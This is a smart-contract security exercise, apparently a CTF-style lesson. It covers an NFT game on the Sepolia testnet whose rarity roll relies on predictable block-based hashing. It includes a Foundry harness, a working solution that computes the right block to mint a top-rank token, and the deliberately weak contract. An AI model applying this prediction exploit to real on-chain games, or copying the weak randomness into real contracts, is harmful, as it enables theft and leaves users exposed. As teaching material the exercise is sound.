# Background
Before the Oracles, it was difficult to generate random numbers. People had to use `sha3(block.number)` or other built-in variables to simulate the randomness.

# The predictable NFT game
In this game, there are 3 possible NFT ranks: Common(1), Rare(2), Superior(3).

Their randomization algorithm is weak, making it possible to predict the minting result.
The contract:
https://sepolia.etherscan.io/address/0x8cC29Bb28f6e789C163d230F0B99652cDD51b794

# The Goal
Analyze the contract's bytecode and find out its weakness.
You have 1 ether to mint 1 token, make sure to mint a Superior one.
You can wait and mint it on the right block.

# Foundry setup:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("https://rpc.ankr.com/eth_sepolia");
		vm.deal(hacker, 1 ether);

		nft = address(0x8cC29Bb28f6e789C163d230F0B99652cDD51b794);
	}

	function test() public {
		vm.startPrank(hacker);

		uint mintedId;

		uint currentBlockNum = block.number;

		// Mint a Superior one, do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// call the function `mint()` on the right block and break the loop
			// ---- hacking time ----

			// ---- end of hacking ----

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}

```

# Hint
- You can use the decompiler on https://sepolia.etherscan.io/bytecode-decompiler?a=0x8cC29Bb28f6e789C163d230F0B99652cDD51b794
- Or refer to the source code at the end.


# Solution
`---- hacking time ----`:
```solidity
			(, bytes memory ret) = nft.call(abi.encodeWithSignature(
				"id()"
			));
			uint nextId = uint(bytes32(ret)) + 1;

			uint score = uint256(keccak256(abi.encode(
				nextId, hacker, currentBlockNum
			))) % 100;

			if(score > 90) {
				(, bytes memory ret) = nft.call{value: 1 ether}(abi.encodeWithSignature(
					"mint()"
				));
				mintedId = uint(bytes32(ret));
				break;
			}
```

# The source code of that contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.19;

contract PredictableNFT {
	uint public id;

	mapping(uint => uint) public tokens; // map of: tokenId => rank

	function mint() external payable returns(uint) {
		require(msg.value == 1 ether, "show me the money");

		id += 1;

		uint rank = random();

		tokens[id] = rank;

		return id;
	}

	function random() private view returns(uint) {
		uint randScore = uint256(keccak256(abi.encode(
			id, msg.sender, block.number
		))) % 100;

		if(randScore > 90) {
			return 3; // Superior
		} else if(randScore > 80) {
			return 2; // Rare
		} else {
			return 1; // Common
		}
	}
}
```


